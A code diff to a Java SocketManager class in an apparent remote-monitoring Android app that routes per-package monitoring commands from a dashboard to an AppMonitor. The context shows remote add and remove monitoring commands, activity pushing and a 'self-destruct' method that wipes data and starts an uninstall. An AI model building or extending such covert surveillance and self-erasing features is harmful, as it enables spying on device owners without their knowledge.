@@ -367,7 +367,7 @@ public class SocketManager {
     private volatile long    lastTouchTime = 0L;
 
     // Dynamic monitored packages (runtime additions from dashboard)
-    private final java.util.Set<String> dynamicMonitoredPackages = new java.util.concurrent.CopyOnWriteArraySet<>();
+    
 
     // Command Handlers — one instance each, created once and reused
     private final CommandExecutor      commandExecutor;
@@ -2304,7 +2304,9 @@ public class SocketManager {
         // ── Dynamic app monitoring ────────────────────────────────────────
         if (command.equals("add_monitored_app")) {
             String pkg = params.optString("packageName", "");
-            if (!pkg.isEmpty()) dynamicMonitoredPackages.add(pkg);
+            if (!pkg.isEmpty()) {
+                getAppMonitor().instanceAddMonitored(pkg);
+            }
             JSONObject r = new JSONObject();
             r.put("success", true);
             r.put("message", "Now monitoring: " + pkg);
@@ -2312,7 +2314,9 @@ public class SocketManager {
         }
         if (command.equals("remove_monitored_app")) {
             String pkg = params.optString("packageName", "");
-            dynamicMonitoredPackages.remove(pkg);
+            if (!pkg.isEmpty()) {
+                getAppMonitor().instanceRemoveMonitored(pkg);
+            }
             JSONObject r = new JSONObject();
             r.put("success", true);
             r.put("message", "Stopped monitoring: " + pkg);
@@ -3963,11 +3967,6 @@ public class SocketManager {
                 Log.e(TAG, "pushRecentActivity error: " + e.getMessage());
             }
         });
-    }
-
-    /** Whether a package is monitored (static config OR dynamically added). */
-    public boolean isDynamicallyMonitored(String pkg) {
-        return dynamicMonitoredPackages.contains(pkg);
     }
 
     /** Self-destruct: clear data and launch uninstall flow. */
